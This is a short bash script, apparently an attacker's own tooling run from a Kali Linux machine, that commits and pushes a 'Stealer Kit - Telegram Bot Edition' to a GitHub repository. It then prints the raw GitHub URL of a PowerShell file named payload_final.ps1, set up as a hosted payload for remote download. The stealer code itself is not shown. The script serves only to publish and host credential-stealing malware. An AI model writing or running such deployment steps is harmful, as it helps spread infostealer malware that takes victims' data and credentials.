#!/bin/bash
# ============================================
# DEPLOY STEALER KIT A GITHUB
# ============================================

REPO_NAME="stealer-repo"
GITHUB_USER="isajarGamer2"
DEPLOY_DIR="/home/kali/paginaminevoid/media/sf_pasar_datos"

cd "$DEPLOY_DIR"

git add .
git commit -m "Stealer Kit - Telegram Bot Edition - Fixed PowerShell syntax"
git push origin main

echo ""
echo "DEPLOY COMPLETO"
echo "Repo: https://github.com/$GITHUB_USER/$REPO_NAME"
echo "Payload: https://raw.githubusercontent.com/$GITHUB_USER/$REPO_NAME/main/payload_final.ps1"
